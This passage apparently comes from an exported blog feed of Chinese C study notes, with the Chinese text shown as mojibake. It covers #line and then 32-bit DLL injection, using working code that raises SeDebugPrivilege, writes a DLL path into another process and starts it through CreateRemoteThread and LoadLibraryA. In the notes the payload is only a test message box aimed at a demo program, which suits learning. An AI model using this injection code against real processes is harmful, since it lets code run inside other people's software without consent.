class="keyword">pragma</span>æŒ‡ä»¤æ²¡æœ‰æ­£å¼çš„å®šä¹‰ã€‚ç¼–è¯‘å™¨å¯ä»¥è‡ªå®šä¹‰å…¶ç”¨é€”ã€‚å…¸å‹çš„ç”¨æ³•æ˜¯ç¦æ­¢æˆ–å…è®¸æŸäº›çƒ¦äººçš„è­¦å‘Šä¿¡æ¯ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¾‹10,#lineä¸¾ä¾‹</span></span><br><span class="line"><span class="meta">#<span class="keyword">line</span>   100          <span class="comment">//åˆå§‹åŒ–è¡Œè®¡æ•°å™¨ </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>    <span class="comment">//è¡Œå·100</span></span></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,__LINE__);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡º104</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-06_32ä½ä¸‹dllæ³¨å…¥</title>
    <url>/posts/9c5cfbfa/</url>
    <content><![CDATA[<p>VirtualAllocEx    å…¶ä»–è¿›ç¨‹çš„åœ°å€ç©ºé—´ç”³è¯·å†…å­˜</p>
<p>WriteProcessMemory    å°†ä»£ç æ•°æ®å†™å…¥åˆ°ç›®çš„è¿›ç¨‹</p>
<p>CreateRomoteThread    åœ¨å…¶ä»–è¿›ç¨‹ä¸­åˆ›å»ºçº¿ç¨‹</p>
<ol>
<li>å°†éœ€è¦æ‰§è¡Œçš„ä»£ç å†™åˆ°ä¸€ä¸ªdllä¸­ </li>
<li>åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—å†…å­˜å°†dllæ–‡ä»¶åå†™å…¥</li>
<li>å°†ç›®æ ‡è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„Loadlibaryå½“ä½œçº¿ç¨‹å‡½æ•°æ‰§è¡Œ</li>
</ol>
<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HMODULE hmodle,DWORD dwReason,<span class="type">void</span>* p)</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//è¿›ç¨‹åˆ›å»ºæ—¶è°ƒç”¨    åˆšåŠ è½½æ—¶ä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;æ³¨å…¥æˆåŠŸ&quot;</span>, <span class="string">&quot;æ³¨å…¥æˆåŠŸ&quot;</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//case DLL_PROCESS_DETACH:  //è¿›ç¨‹é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å±æ€§é¡µ  é…ç½®å±æ€§-&gt;å¸¸è§„-&gt; ç”Ÿæˆdll      ï¼› c/c++ -&gt;ä»£ç ç”Ÿæˆ-&gt;Spectreç¼“è§£ æ”¹ä¸ºå·²ç¦ç”¨</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å…¥ä¹‹å‰éœ€è¦å¯¹è¿›ç¨‹ææƒ</span></span><br><span class="line"><span class="type">int</span>	è¿›ç¨‹ææƒ() &#123;</span><br><span class="line">	<span class="type">int</span> FLAG = <span class="number">0</span>;  <span class="comment">//ææƒæ˜¯å¦æˆåŠŸ æˆåŠŸä¸º1</span></span><br><span class="line">	HANDLE è¿›ç¨‹è®¿é—®ä»¤ç‰Œ ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,&amp;è¿›ç¨‹è®¿é—®ä»¤ç‰Œ)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES ä»¤ç‰Œæƒé™;</span><br><span class="line">		ä»¤ç‰Œæƒé™.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;ä»¤ç‰Œæƒé™.Privileges[<span class="number">0</span>].Luid);<span class="comment">//éå†æƒé™</span></span><br><span class="line"></span><br><span class="line">		ä»¤ç‰Œæƒé™.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//å¼€å¯ç‰¹æƒ</span></span><br><span class="line">		<span class="keyword">if</span> (AdjustTokenPrivileges(è¿›ç¨‹è®¿é—®ä»¤ç‰Œ,FALSE,&amp;ä»¤ç‰Œæƒé™,<span class="keyword">sizeof</span>(ä»¤ç‰Œæƒé™),<span class="literal">NULL</span>,<span class="literal">NULL</span>)) &#123;</span><br><span class="line">			FLAG = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(è¿›ç¨‹è®¿é—®ä»¤ç‰Œ);</span><br><span class="line">	<span class="keyword">return</span> FLAG;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†è¿›ç¨‹   // ç›®å‰åœ¨è¿›ç¨‹éå†æ—¶æ— æ³•æ‰¾åˆ°å¯¹åº”å ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="type">int</span> _findProcess(<span class="type">char</span>* name) &#123;</span><br><span class="line">	HANDLE å¿«ç…§ = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	Process32First(å¿«ç…§, &amp;pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Process32Next(å¿«ç…§,&amp;pe32))&#123;</span><br><span class="line">		<span class="keyword">if</span> (_strcmpi(pe32.szExeFile, name) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//æ‰¾ä¸åˆ°è¿”å›0</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å…¥çš„exe  å’Œ ä½¿ç”¨çš„dllå</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinject</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (è¿›ç¨‹ææƒ() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE ç›®æ ‡è¿›ç¨‹ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹ID!=<span class="number">0</span>) &#123;  <span class="comment">//æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line">			HANDLE ç›®æ ‡è¿›ç¨‹å¥æŸ„ = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ç›®æ ‡è¿›ç¨‹ID);</span><br><span class="line">			<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹å¥æŸ„ != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">				<span class="comment">//å¼€å§‹æ³¨å…¥</span></span><br><span class="line">				<span class="comment">//è·å–dlllength  åœ¨ç›®æ ‡ç”³è¯·ä¸€å—å†…å­˜ å†™å…¥dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span> * dllæ–‡ä»¶ååœ°å€ = VirtualAllocEx(ç›®æ ‡è¿›ç¨‹å¥æŸ„,<span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dllæ–‡ä»¶ååœ°å€ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;åˆ†é…å†…å­˜å¤±è´¥&quot;</span>);</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">					WriteProcessMemory(ç›®æ ‡è¿›ç¨‹å¥æŸ„, dllæ–‡ä»¶ååœ°å€, dllname, dllLength, <span class="number">0</span>); <span class="comment">//å†™å…¥å†…å­˜</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//åˆ›å»ºè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary åœ¨ker32ä¸‹</span></span><br><span class="line">					LPTHREAD_START_ROUTINE å‡½æ•°åœ°å€ = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread =  CreateRemoteThread(ç›®æ ‡è¿›ç¨‹å¥æŸ„,<span class="literal">NULL</span>,<span class="number">0</span>,å‡½æ•°åœ°å€,dllæ–‡ä»¶ååœ°å€,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹æ‰“å¼€å¤±è´¥&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹ææƒå¤±è´¥&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* exename = <span class="string">&quot;AsmDEMO.exe&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* dllname = <span class="string">&quot;32injectdll.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">	dllinject(exename,dllname);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸€ä¸ª32ä½demo.exeæµ‹è¯•</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hellworld&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è°ƒè¯•ç›®å‰æ— æ³•é€šè¿‡è¿›ç¨‹éå†æ‰¾åˆ°æ‰€è¦æµ‹è¯•çš„demo.exe â€¦.. åŸå› æ‰¾åˆ°äº† <strong>æ˜¯å› ä¸ºå­—ç¬¦é›†é—®é¢˜</strong> æœ¬æ¥æ˜¯ä½¿ç”¨çš„Unicode è®¾ç½®æˆæœªè®¾ç½® å³å¯æˆåŠŸè¯»å–åˆ°è¿›ç¨‹  æˆåŠŸå°†dllæ³¨å…¥åˆ°32ä½çš„exeä¸‹</p>
<p><img src="/posts/9c5cfbfa/6-1.png" alt="img"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>é€‰æ‹©åŠ è½½dllä¸­çš„æŒ‡å®šå‡½æ•°</p>
<p>dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">fn</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;fnæ³¨å…¥æˆåŠŸ&quot;</span>, <span class="string">&quot;fnæ³¨å…¥æˆåŠŸ&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HMODULE hmodle,DWORD dwReason,<span class="type">void</span>* p)</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//è¿›ç¨‹åˆ›å»ºæ—¶è°ƒç”¨    åˆšåŠ è½½æ—¶ä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;æ³¨å…¥æˆåŠŸ&quot;</span>, <span class="string">&quot;æ³¨å…¥æˆåŠŸ&quot;</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//case DLL_PROCESS_DETACH:  //è¿›ç¨‹é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å…¥ä¹‹å‰éœ€è¦å¯¹è¿›ç¨‹ææƒ</span></span><br><span class="line"><span class="type">int</span>	è¿›ç¨‹ææƒ() &#123;</span><br><span class="line">	<span class="type">int</span> FLAG = <span class="number">0</span>;  <span class="comment">//ææƒæ˜¯å¦æˆåŠŸ æˆåŠŸä¸º1</span></span><br><span class="line">	HANDLE è¿›ç¨‹è®¿é—®ä»¤ç‰Œ ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,&amp;è¿›ç¨‹è®¿é—®ä»¤ç‰Œ)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES ä»¤ç‰Œæƒé™;</span><br><span class="line">		ä»¤ç‰Œæƒé™.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;ä»¤ç‰Œæƒé™.Privileges[<span class="number">0</span>].Luid);<span class="comment">//éå†æƒé™</span></span><br><span class="line"></span><br><span class="line">		ä»¤ç‰Œæƒé™.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//å¼€å¯ç‰¹æƒ</span></span><br><span class="line">		<span class="keyword">if</span> (AdjustTokenPrivileges(è¿›ç¨‹è®¿é—®ä»¤ç‰Œ,FALSE,&amp;ä»¤ç‰Œæƒé™,<span class="keyword">sizeof</span>(ä»¤ç‰Œæƒé™),<span class="literal">NULL</span>,<span class="literal">NULL</span>)) &#123;</span><br><span class="line">			FLAG = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(è¿›ç¨‹è®¿é—®ä»¤ç‰Œ);</span><br><span class="line">	<span class="keyword">return</span> FLAG;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†è¿›ç¨‹</span></span><br><span class="line"><span class="type">int</span> _findProcess(<span class="type">char</span>* name) &#123;</span><br><span class="line">	HANDLE å¿«ç…§ = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	Process32First(å¿«ç…§, &amp;pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Process32Next(å¿«ç…§, &amp;pe32)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (_strcmpi(pe32.szExeFile, name) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;æ‰¾åˆ°å¯¹åº”è¿›ç¨‹å!\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//æ‰¾ä¸åˆ°è¿”å›0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å…¥çš„exe  å’Œ ä½¿ç”¨çš„dllå</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinject</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åŠ è½½dllinjectå‡½æ•°\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (è¿›ç¨‹ææƒ() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE ç›®æ ‡è¿›ç¨‹ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹ID!=<span class="number">0</span>) &#123;  <span class="comment">//æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line">			HANDLE ç›®æ ‡è¿›ç¨‹å¥æŸ„ = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ç›®æ ‡è¿›ç¨‹ID);</span><br><span class="line">			<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹å¥æŸ„ != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹æ³¨å…¥\n&quot;</span>);</span><br><span class="line">				<span class="comment">//å¼€å§‹æ³¨å…¥</span></span><br><span class="line">				<span class="comment">//è·å–dlllength  åœ¨ç›®æ ‡ç”³è¯·ä¸€å—å†…å­˜ å†™å…¥dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span> * dllæ–‡ä»¶ååœ°å€ = VirtualAllocEx(ç›®æ ‡è¿›ç¨‹å¥æŸ„,<span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dllæ–‡ä»¶ååœ°å€ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					GetLastError();</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;åˆ†é…å†…å­˜å¤±è´¥\n&quot;</span>);</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹å†™å…¥å†…å­˜\n&quot;</span>);</span><br><span class="line">					WriteProcessMemory(ç›®æ ‡è¿›ç¨‹å¥æŸ„, dllæ–‡ä»¶ååœ°å€, dllname, dllLength, <span class="number">0</span>); <span class="comment">//å†™å…¥å†…å­˜</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//åˆ›å»ºè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary åœ¨ker32ä¸‹</span></span><br><span class="line">					LPTHREAD_START_ROUTINE å‡½æ•°åœ°å€ = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread =  CreateRemoteThread(ç›®æ ‡è¿›ç¨‹å¥æŸ„,<span class="literal">NULL</span>,<span class="number">0</span>,å‡½æ•°åœ°å€,dllæ–‡ä»¶ååœ°å€,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥\n&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹æ‰“å¼€å¤±è´¥\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;æ‰¾ä¸åˆ°å¯¹åº”è¿›ç¨‹ï¼\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹ææƒå¤±è´¥&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinjectfn</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname, <span class="type">char</span>* fnname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åŠ è½½dllinjectfnå‡½æ•°\n&quot;</span>);</span><br><span class="line">	HMODULE dllæ¨¡å—é¦–åœ°å€ = LoadLibrary(dllname);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>(*fnå‡½æ•°åœ°å€)() = (<span class="type">void</span>(*)()) GetProcAddress(dllæ¨¡å—é¦–åœ°å€,fnname);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> åç§»é‡ = (<span class="type">char</span>*)fnå‡½æ•°åœ°å€ - (<span class="type">char</span>*)dllæ¨¡å—é¦–åœ°å€;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (è¿›ç¨‹ææƒ() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE ç›®æ ‡è¿›ç¨‹ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹ID != <span class="number">0</span>) &#123;  <span class="comment">//æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line">			HANDLE ç›®æ ‡è¿›ç¨‹å¥æŸ„ = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ç›®æ ‡è¿›ç¨‹ID);</span><br><span class="line">			<span class="keyword">if</span> (ç›®æ ‡è¿›ç¨‹å¥æŸ„ != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹æ³¨å…¥\n&quot;</span>);</span><br><span class="line">				<span class="comment">//å¼€å§‹æ³¨å…¥</span></span><br><span class="line">				<span class="comment">//è·å–dlllength  åœ¨ç›®æ ‡ç”³è¯·ä¸€å—å†…å­˜ å†™å…¥dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span>* dllæ–‡ä»¶ååœ°å€ = VirtualAllocEx(ç›®æ ‡è¿›ç¨‹å¥æŸ„, <span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dllæ–‡ä»¶ååœ°å€ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					GetLastError();</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;åˆ†é…å†…å­˜å¤±è´¥\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹å†™å…¥å†…å­˜\n&quot;</span>);</span><br><span class="line">					WriteProcessMemory(ç›®æ ‡è¿›ç¨‹å¥æŸ„, dllæ–‡ä»¶ååœ°å€, dllname, dllLength, <span class="number">0</span>); <span class="comment">//å†™å…¥å†…å­˜</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//åˆ›å»ºè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary åœ¨ker32ä¸‹</span></span><br><span class="line">					LPTHREAD_START_ROUTINE å‡½æ•°åœ°å€ = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread = CreateRemoteThread(ç›®æ ‡è¿›ç¨‹å¥æŸ„, <span class="literal">NULL</span>, <span class="number">0</span>, å‡½æ•°åœ°å€, dllæ–‡ä»¶ååœ°å€, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥\n&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					WaitForSingleObject(hthread, INFINITE);</span><br><span class="line"></span><br><span class="line">					DWORD dllæ¨¡å— = <span class="number">0</span>; <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">					GetExitCodeThread(hthread, &amp;dllæ¨¡å—);</span><br><span class="line">					<span class="type">void</span>(*fn)() = (dllæ¨¡å— + åç§»é‡); <span class="comment">//è¿”å›ä¸€ä¸ªåœ°å€   void(*)</span></span><br><span class="line">					<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">					hthread = CreateRemoteThread(ç›®æ ‡è¿›ç¨‹å¥æŸ„, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)fn, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥\n&quot;</span>);</span><br><span class="line">					